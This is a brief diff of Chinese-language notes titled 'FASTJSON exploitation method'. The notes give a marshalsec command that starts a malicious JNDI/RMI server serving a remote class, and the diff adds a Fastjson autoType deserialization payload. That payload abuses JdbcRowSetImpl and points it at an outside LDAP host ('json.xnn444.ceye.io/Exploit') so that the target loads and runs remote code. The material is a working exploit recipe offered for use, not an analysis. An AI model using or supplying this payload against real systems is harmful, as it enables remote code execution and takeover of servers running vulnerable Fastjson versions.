@@ -6,4 +6,5 @@ FASTJSON 漏洞利用方式
 LDAP服务启动（利用marshalsec）
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:port/#类名，不带class 8888
 
+{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://json.xnn444.ceye.io/Exploit","autoCommit":true}}
 
